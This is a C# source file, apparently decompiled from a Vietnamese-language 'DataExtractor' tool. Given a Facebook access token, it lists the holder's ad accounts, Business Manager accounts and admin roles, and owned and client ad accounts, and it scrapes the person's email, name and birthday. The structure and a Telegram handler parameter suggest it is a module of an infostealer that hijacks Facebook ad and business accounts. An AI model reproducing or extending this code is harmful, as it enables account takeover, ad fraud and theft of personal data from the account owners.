using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using cnData.Core.Models.Json;
using CokiWin.Core.Models.Json.BusinessJsonModel;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Models;
using DataExtractor.Core.Models.Json.AdsDataJsonModel;
using HtmlAgilityPack;
using Newtonsoft.Json;

namespace DataExtractor.Core.Handlers.Fb;

internal class InfoFbHandler
{
	public void RunScan(HttpClient httpClient, FbData fbData, TelegramHandler telegramHandler)
	{
		if (string.IsNullOrEmpty(fbData.Email))
		{
			fbData.Email = GetData(fbData, httpClient);
		}
		List<AdsAccount> adsFromToken = GetAdsFromToken(fbData, httpClient, telegramHandler);
		List<AdsBusiness> bm2 = GetBm(fbData, httpClient, telegramHandler);
		GetOwnAdsFromBm(fbData, bm2, httpClient);
		GetClientAdsFromBm(fbData, bm2, httpClient);
		foreach (AdsAccount account6 in adsFromToken)
		{
			if (fbData.AdsAccount.FirstOrDefault((AdsAccount a) => a.id == account6.id) == null)
			{
				fbData.AdsAccount.Add(account6);
			}
		}
		foreach (AdsBusiness bm in bm2)
		{
			AdsBusiness adsBusiness = fbData.Bussinesses.FirstOrDefault((AdsBusiness a) => a.id == bm.id);
			if (adsBusiness == null)
			{
				fbData.Bussinesses.Add(bm);
				continue;
			}
			adsBusiness.clients = bm.clients;
			adsBusiness.AdsAccount = bm.AdsAccount;
			adsBusiness.IsAdmin = bm.IsAdmin;
			adsBusiness.IsCantShareLink = false;
		}
		foreach (AdsAccount account5 in bm2.Where((AdsBusiness a) => a.clients != null).SelectMany((AdsBusiness a) => a.clients))
		{
			if (!adsFromToken.Any((AdsAccount a) => a.id == account5.id))
			{
				adsFromToken.Add(account5);
			}
		}
		foreach (AdsAccount account4 in bm2.Where((AdsBusiness a) => a.AdsAccount != null).SelectMany((AdsBusiness a) => a.AdsAccount))
		{
			if (!adsFromToken.Any((AdsAccount a) => a.id == account4.id))
			{
				adsFromToken.Add(account4);
			}
		}
		foreach (AdsAccount account3 in fbData.AdsAccount)
		{
			if (account3.business != null)
			{
				AdsBusiness adsBusiness2 = fbData.Bussinesses.FirstOrDefault((AdsBusiness a) => a.id == account3.business.id);
				if (adsBusiness2 != null && adsBusiness2.AdsAccount.FirstOrDefault((AdsAccount a) => a.id == account3.id) == null)
				{
					adsBusiness2.AdsAccount.Add(account3);
				}
			}
		}
		foreach (AdsAccount account2 in fbData.Bussinesses.Where((AdsBusiness a) => a.clients != null).SelectMany((AdsBusiness a) => a.clients))
		{
			if (!fbData.AdsAccount.Any((AdsAccount a) => a.id == account2.id))
			{
				fbData.AdsAccount.Add(account2);
			}
		}
		foreach (AdsAccount account in fbData.Bussinesses.Where((AdsBusiness a) => a.AdsAccount != null).SelectMany((AdsBusiness a) => a.AdsAccount))
		{
			if (!fbData.AdsAccount.Any((AdsAccount a) => a.id == account.id))
			{
				fbData.AdsAccount.Add(account);
			}
		}
	}

	private List<AdsAccount> GetAdsFromToken(FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		Queue<string> queue = new Queue<string>(new string[3] { "v14.0", "v15.0", "v16.0" });
		string text = queue.Dequeue();
		string token = fbData.GetToken();
		if (string.IsNullOrEmpty(token))
		{
			fbData.Log("KO co token de scan");
			return new List<AdsAccount>();
		}
		List<AdsAccount> list = new List<AdsAccount>();
		string text2 = null;
		text2 = ((!string.IsNullOrEmpty(fbData.NextAdsAccountScanUrl)) ? fbData.NextAdsAccountScanUrl : ("https://graph.facebook.com/" + text + "/me/adaccounts?fields=business&limit=50&access_token=" + token));
		int num = 10;
		while (num-- > 0)
		{
			string @string = httpClient.GetString(text2);
			if (@string.Contains("Error loading application"))
			{
				token = fbData.GetToken();
				fbData.Log("Load app failed");
				text2 = "https://graph.facebook.com/" + text + "/me/adaccounts?fields=business&limit=50&access_token=" + token;
				continue;
			}
			if (@string.Contains("You are calling a deprecated version of the Ads API"))
			{
				fbData.Log("version " + text + " hết hạn, đổi sang version khác");
				if (queue.Count == 0)
				{
					fbData.Log("ko get đc data, vì đã thử hết các version rồi");
					return new List<AdsAccount>();
				}
				text = queue.Dequeue();
				text2 = "https://graph.facebook.com/" + text + "/me/adaccounts?fields=business&limit=50&access_token=" + token;
				continue;
			}
			fbData.Log("result " + text2 + " : " + @string);
			AdsDataJsonModel adsDataJsonModel = JsonConvert.DeserializeObject<AdsDataJsonModel>(@string);
			if ((adsDataJsonModel.data == null || adsDataJsonModel.data.Length == 0) && !string.IsNullOrEmpty(fbData.NextAdsAccountScanUrl))
			{
				token = fbData.GetToken();
				fbData.Log("scan bằng link cũ ko được, reset scan lại");
				text2 = "https://graph.facebook.com/" + text + "/me/adaccounts?fields=business&limit=50&access_token=" + token;
				continue;
			}
			if (adsDataJsonModel.data != null && adsDataJsonModel.data.Length != 0)
			{
				list.AddRange(adsDataJsonModel.data);
			}
			if (adsDataJsonModel.paging == null || string.IsNullOrEmpty(adsDataJsonModel.paging.next))
			{
				fbData.NextAdsAccountScanUrl = "";
				break;
			}
			if (list.Count > 100)
			{
				fbData.Log("Có vẻ qua nhiều account đợi lượt sau");
				fbData.NextAdsAccountScanUrl = adsDataJsonModel.paging.next;
				break;
			}
			text2 = adsDataJsonModel.paging.next;
			num = 10;
		}
		return list;
	}

	private string GetYear(HttpClient httpClient, FbData fbData)
	{
		fbData.Log("Get year by me/about");
		string requestUri = "https://mbasic.facebook.com/me/about";
		HttpRequestMessage httpRequestMessage = new HttpRequestMessage(HttpMethod.Get, requestUri);
		httpRequestMessage.Headers.Add("Sec-Fetch-Dest", "document");
		httpRequestMessage.Headers.Add("Sec-Fetch-Mode", "navigate");
		try
		{
			string @string = httpClient.GetString("https://mbasic.facebook.com/me/about", new Dictionary<string, string>
			{
				{ "Sec-Fetch-Dest", "document" },
				{ "Sec-Fetch-Mode", "navigate" }
			});
			HtmlDocument htmlDocument = new HtmlDocument();
			htmlDocument.LoadHtml(@string);
			HtmlNode htmlNode = htmlDocument.DocumentNode.Descendants("a").FirstOrDefault((HtmlNode a) => a.GetAttributeValue<string>("href", "").Contains("edit=birthday"));
			if (htmlNode != null)
			{
				HtmlNode htmlNode2 = htmlNode.ParentNode.ParentNode.ParentNode.ParentNode.Descendants("td").ElementAtOrDefault(1);
				if (htmlNode2 != null)
				{
					return htmlNode2.InnerText;
				}
			}
			fbData.Log("Cant find year " + @string);
			return "";
		}
		catch (Exception ex)
		{
			fbData.Log(ex.ToString());
		}
		return "";
	}

	private string GetData(FbData fbData, HttpClient httpClient)
	{
		string tokenEmail = fbData.GetTokenEmail();
		string requestUri = "https://graph.facebook.com/v11.0/me?fields=name,email,birthday&access_token=" + tokenEmail;
		HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, requestUri);
		try
		{
			HttpResponseMessage result = httpClient.SendAsync(request).Result;
			if (result.StatusCode == HttpStatusCode.OK)
			{
				string result2 = result.Content.ReadAsStringAsync().Result;
				fbData.Log("Data get mail : " + result2);
				DataJsonModel dataJsonModel = JsonConvert.DeserializeObject<DataJsonModel>(result2);
				if (string.IsNullOrEmpty(dataJsonModel.Birthday))
				{
					dataJsonModel.Birthday = GetYear2(httpClient, fbData);
				}
				if (string.IsNullOrEmpty(dataJsonModel.Birthday))
				{
					dataJsonModel.Birthday = GetYear(httpClient, fbData);
				}
				fbData.Log(dataJsonModel.Email + " - " + dataJsonModel.Name + " - " + dataJsonModel.Birthday);
				return dataJsonModel.Email + " - " + dataJsonModel.Name + " - " + dataJsonModel.Birthday;
			}
			return "";
		}
		catch (Exception ex)
		{
			fbData.Log("Get email failed \n " + ex.ToString());
			return null;
		}
		finally
		{
		}
	}

	private string GetYear2(HttpClient httpClient, FbData fbData)
	{
		fbData.Log("Get year by https://mbasic.facebook.com/editprofile.php?type=basic&edit=birthday");
		string requestUri = "https://mbasic.facebook.com/editprofile.php?type=basic&edit=birthday";
		HttpRequestMessage httpRequestMessage = new HttpRequestMessage(HttpMethod.Get, requestUri);
		httpRequestMessage.Headers.Add("Sec-Fetch-Dest", "document");
		httpRequestMessage.Headers.Add("Sec-Fetch-Mode", "navigate");
		try
		{
			HttpResponseMessage result = httpClient.SendAsync(httpRequestMessage).Result;
			string result2 = result.Content.ReadAsStringAsync().Result;
			HtmlDocument htmlDocument = new HtmlDocument();
			htmlDocument.LoadHtml(result2);
			IEnumerable<HtmlNode> source = htmlDocument.DocumentNode.Descendants("select");
			string text = source.FirstOrDefault((HtmlNode a) => a.GetAttributeValue<string>("id", "") == "month")?.Descendants("option").FirstOrDefault((HtmlNode a) => a.GetAttributeValue<string>("selected", "") == "1")?.GetAttributeValue<string>("value", "");
			string text2 = source.FirstOrDefault((HtmlNode a) => a.GetAttributeValue<string>("id", "") == "year")?.Descendants("option").FirstOrDefault((HtmlNode a) => a.GetAttributeValue<string>("selected", "") == "1")?.GetAttributeValue<string>("value", "");
			string text3 = source.FirstOrDefault((HtmlNode a) => a.GetAttributeValue<string>("id", "") == "day")?.Descendants("option").FirstOrDefault((HtmlNode a) => a.GetAttributeValue<string>("selected", "") == "1")?.GetAttributeValue<string>("value", "");
			if (string.IsNullOrEmpty(text))
			{
				return "";
			}
			return text3 + "/" + text + "/" + text2;
		}
		catch (Exception ex)
		{
			fbData.Log(ex.ToString());
		}
		return "";
	}

	private List<AdsBusiness> GetBm(FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		List<AdsBusiness> list = new List<AdsBusiness>();
		string token = fbData.GetToken();
		string text = null;
		text = ((!string.IsNullOrEmpty(fbData.NextBmScanUrl)) ? fbData.NextBmScanUrl : ("https://graph.facebook.com/v14.0/me/businesses?fields=verification_status,name,permitted_roles,clients.limit(50)&limit=50&access_token=" + token));
		while (true)
		{
			string @string = httpClient.GetString(text);
			try
			{
				fbData.Log("BM RESULT : " + @string);
				BusinessJsonModel businessJsonModel = JsonConvert.DeserializeObject<BusinessJsonModel>(@string);
				List<AdsBusiness> list2 = businessJsonModel.data.Select((Datum a) => new AdsBusiness
				{
					id = a.id,
					name = a.id + " - " + a.name,
					verifyStatus = a.verification_status,
					clients = a.clients?.data?.SelectMany((Datum1 a) => (a.adaccount_permissions == null) ? Enumerable.Empty<AdsAccount>() : a.adaccount_permissions.Select((Adaccount_Permissions adsAccount) => new AdsAccount
					{
						id = adsAccount.id,
						business = new AdsBusiness
						{
							id = a.id,
							name = a.name
						}
					})).ToList(),
					IsAdmin = (a.permitted_roles == null || a.permitted_roles.FirstOrDefault((string role) => role == "ADMIN") != null)
				}).ToList();
				if ((list2 == null || list2.Count == 0) && !string.IsNullOrEmpty(fbData.NextBmScanUrl))
				{
					fbData.Log("Scan bằng link cũ ko đc reset scan lại");
					fbData.NextBmScanUrl = "";
					text = "https://graph.facebook.com/v11.0/me/businesses?fields=verification_status,name,clients.limit(50)&limit=50&access_token=" + token;
					continue;
				}
				if (list2 != null && list2.Count > 0)
				{
					list.AddRange(list2);
				}
				if (businessJsonModel.paging == null || string.IsNullOrEmpty(businessJsonModel.paging.next))
				{
					fbData.NextBmScanUrl = "";
					return list;
				}
				if (list.Count > 100)
				{
					fbData.Log("BM quá nhiều đợi lượt sau");
					fbData.NextBmScanUrl = businessJsonModel.paging.next;
					return list;
				}
				text = businessJsonModel.paging.next;
			}
			catch
			{
				return list;
			}
		}
	}

	private void GetClientAdsFromBm(FbData fbData, List<AdsBusiness> businesses, HttpClient httpClient)
	{
		if (businesses == null || businesses.Count == 0)
		{
			return;
		}
		foreach (AdsBusiness business in businesses)
		{
			fbData.Log("get client_ad_accounts bm " + business.name);
			string token = fbData.GetToken();
			string url = "https://graph.facebook.com/v14.0/" + business.id + "/client_ad_accounts?fields=id,name&limit=50&access_token=" + token;
			string @string = httpClient.GetString(url);
			fbData.Log("result " + @string);
			if (string.IsNullOrEmpty(@string) || @string.Contains("error"))
			{
				fbData.Log("loi");
				continue;
			}
			AdsDataJsonModel adsDataJsonModel = JsonConvert.DeserializeObject<AdsDataJsonModel>(@string);
			if (adsDataJsonModel == null)
			{
				fbData.Log("Loi");
				break;
			}
			if (adsDataJsonModel.data == null || adsDataJsonModel.data.Length == 0)
			{
				continue;
			}
			AdsAccount[] data = adsDataJsonModel.data;
			foreach (AdsAccount adsAccount in data)
			{
				adsAccount.business = new AdsBusiness
				{
					id = business.id,
					name = business.name
				};
				if (business.clients == null || business.clients.FirstOrDefault((AdsAccount a) => a.id == adsAccount.id) == null)
				{
					if (business.clients == null)
					{
						business.clients = new List<AdsAccount>();
					}
					business.clients.Add(adsAccount);
				}
			}
		}
	}

	private void GetOwnAdsFromBm(FbData fbData, List<AdsBusiness> businesses, HttpClient httpClient)
	{
		if (businesses == null || businesses.Count == 0)
		{
			return;
		}
		foreach (AdsBusiness business in businesses)
		{
			fbData.Log("get owned_ad_accounts bm " + business.name);
			string token = fbData.GetToken();
			string url = "https://graph.facebook.com/v14.0/" + business.id + "/owned_ad_accounts?fields=id,name&limit=50&access_token=" + token;
			string @string = httpClient.GetString(url);
			fbData.Log("result " + @string);
			if (string.IsNullOrEmpty(@string) || @string.Contains("error"))
			{
				fbData.Log("loi");
				continue;
			}
			AdsDataJsonModel adsDataJsonModel = JsonConvert.DeserializeObject<AdsDataJsonModel>(@string);
			if (adsDataJsonModel == null)
			{
				fbData.Log("Loi");
				break;
			}
			if (adsDataJsonModel.data == null || adsDataJsonModel.data.Length == 0)
			{
				continue;
			}
			AdsAccount[] data = adsDataJsonModel.data;
			foreach (AdsAccount adsAccount in data)
			{
				adsAccount.business = new AdsBusiness
				{
					id = business.id,
					name = business.name
				};
				if (business.AdsAccount == null || business.AdsAccount.FirstOrDefault((AdsAccount a) => a.id == adsAccount.id) == null)
				{
					if (business.AdsAccount == null)
					{
						business.AdsAccount = new List<AdsAccount>();
					}
					business.AdsAccount.Add(adsAccount);
				}
			}
		}
	}
}
